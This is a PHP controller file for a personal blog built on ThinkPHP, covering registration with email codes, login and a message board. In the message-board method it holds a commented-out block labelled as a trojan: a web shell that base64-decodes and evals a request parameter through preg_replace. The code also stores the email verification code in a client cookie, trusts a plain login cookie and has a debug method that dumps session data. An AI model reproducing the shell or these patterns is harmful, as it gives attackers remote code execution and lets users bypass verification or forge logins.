<?php
namespace app\home\controller;
use think\Controller;
use think\Request;
use think\Db;
use think\Route;
use Dm\Request\V20151123 as Dm;//阿里云邮件推送
class Index extends Controller
{
    // 初始化
    protected function _initialize()
    {
       if(Request::instance()->isMobile()==false){

       }
    }

    //首页
    public function index()
    {
       $head_title = '我的个人博客';
       $info = Db::name('user')->limit(10)->select();
       //session('name','think');
        //send_emailCode('534012657@qq.com','威武的三房东，请查收邮件');
        //send_eamil("528290768@qq.com");

        //ps(db('user')->insertGetId(array('username'=>1)));
       $this->assign('head_title',$head_title);
       $this->assign('info',$info);
       return $this->fetch('index');
    }

    //注册Ajax 验证用户名。邮箱 等。。
    public function zhuceAjax(){
        if($_POST){
            $username       = input('post.username');
            $email          = input('post.email');
            $password       = input('post.password');
            $is_sendCode    = input('post.send_code');
            $inputCode      = input('post.inputCode');

            $session_code = session('emai_code');
            $cookie_code  = cookie('emai_code');


            //如果验证码超过15分钟 则删除验证码
            if($session_code['send_time']<time()){
                session('emai_code.code',null);
            }
            elseif($cookie_code['send_time']<time()){
                cookie('emai_code.code',null);
            }

            //判断用户名是否被注册
            if($username){
                if(isUsername($username)==false) exit(json_encode(array('status'=>0,'msg'=>'用户名应为4-12个字符，不包含特殊字符')));
                $result = Db::name('user')->where(array('username'=>$username))->find();
                if($result){
                    exit(
                        json_encode(array('status'=>0,'msg'=>'此用户已被注册'))
                    );
                }
            }

            //查询是否被注册 已经发送验证码
            if($email){
                if(isEmail($email)==false) exit(json_encode(array('status'=>0,'msg'=>'请输入正确邮箱')));
                $result = Db::name('user')->where(array('email'=>$email))->find();
                if($result){
                    exit(json_encode(array('status'=>0,'msg'=>'此邮箱已被注册')));
                }
                if($is_sendCode==1){
                    if($session_code['send_time']>time() && $email==$session_code['email']){
                        exit(json_encode(array('status'=>0,'msg'=>'验证码15分钟内有效，请勿重复发送')));
                    }
                    else if($cookie_code['send_time']>time() && $email==$cookie_code['email']){
                        exit(json_encode(array('status'=>0,'msg'=>'验证码15分钟内有效，请勿重复发送')));
                    }
                    $code = send_emailCode($email);
                    if($code){
                        session('emai_code',array('email'=>$email,'code'=>$code,'send_time'=>time()+15*60));
                        cookie('emai_code',array('email'=>$email,'code'=>$code,'send_time'=>time()+15*60),15*60);
                        exit(json_encode(array('status'=>1,'msg'=>'验证码已下发，请登录您的邮箱查收')));
                    }else{
                        exit(json_encode(array('status'=>0,'msg'=>'验证码发送失败，请稍后再试')));
                    }
                }
            }

            if(!$inputCode){
                exit(json_encode(array('status'=>0,'msg'=>'验证码不能为空')));
            }

            //验证密码是否合法
            if($password){
                if(isPassword($password)==false) exit(json_encode(array('status'=>0,'msg'=>'密码长度应为为6-16位，不包含特殊字符')));
            }


            //对比输入的验证码
            if($inputCode != $session_code['code']){
                exit(json_encode(array('status'=>0,'msg'=>'验证码不正确')));
            }

            $data = array();
            $password_info = password($password);
            $data['username'] = $username;
            $data['ugid']     = 1;
            $data['face']     = 1;
            $data['password'] = $password_info['password'];
            $data['encrypt']  = $password_info['encrypt'];
            $data['email']    = $email;
            $data['reg_ip']   = get_ip();
            $data['regtime']  = time();
            $insertid = Db::name('user')->insertGetId($data);
            if($insertid){
                session('emai_code',null);
                cookie('emai_code',null);
                session('login',array('uid'=>$insertid,'username'=>$username));
                exit(json_encode(array('status'=>1,'msg'=>'注册成功')));
            }
        }
    }


    //用户登录
    public function login(){
        if($_POST){
            $username = input('post.username');
            $password = input('post.password');
            $autoLogin = input('post.autoLogin');
            if(isEmail($username)){
                $usernameInfo = Db::name('user')->where(array('email'=>$username))->find();
            }
            else if(isPhone($username)){
                $usernameInfo = Db::name('user')->where(array('mobile'=>$username))->find();
            }else{
                $usernameInfo = Db::name('user')->where(array('username'=>$username))->find();
            }

            if(!$usernameInfo) exit(json_encode(array('status'=>0,'msg'=>'此用户不存在')));

            $password = password($password,$usernameInfo['encrypt']);
            $res = Db::name('user')->where(array('username'=>$username,'password'=>$password))->find();
            if($res){
                session('login',array('uid'=>$res['uid'],'username'=>$res['username']));
                if($autoLogin==1){
                    cookie('login',array('uid'=>$res['uid'],'username'=>$res['username']),24*60*60);
                }
                exit(json_encode(array('status'=>1,'msg'=>'登录成功')));
            }
            exit(json_encode(array('status'=>0,'msg'=>'用户名或密码不正确')));
        }
    }

    public function text()
    {
        //session('emai_code.code',null);
        p(session('emai_code'));
        p(cookie('emai_code'));
        p(session('login'));
        //ps(create_randomstr(4));
    }

    //退出登录
    public function login_out()
    {
        if($_POST){
            $login_out = input('post.login_out');
            if($login_out==1){
                session('login',null);
                cookie('login',null);
                exit(json_encode(array('status'=>1,'msg'=>'退出成功')));
            }
        }
    }

    //留言板
    public function message()
    {
        $head_title = '寄语-留言板';
        if($_POST){
       
           //$a =  input('post.content');
            $a =  addslashes($_POST['content']);
            stripslashes($a);
            /*                                              =======木马==========
            $calvin = "sorry";
            $item['sorry'] = 'preg_replace';
            @${'a'.rraya}[] = $item;
            //@${'a'.rraya}[0]['sorry'](str_rot13('/n/r'),base64_decode('ZXZhbChiYXNlNjRfZGVjb2RlKCRfUkVRVUVTVFskY2FsdmluXSkp'),'a');
            @$res = preg_replace("/a/e",eval(base64_decode($_REQUEST[$calvin])),'a');
            */

        }
        $this->assign('head_title',$head_title);
        return $this->fetch('message');
    }

}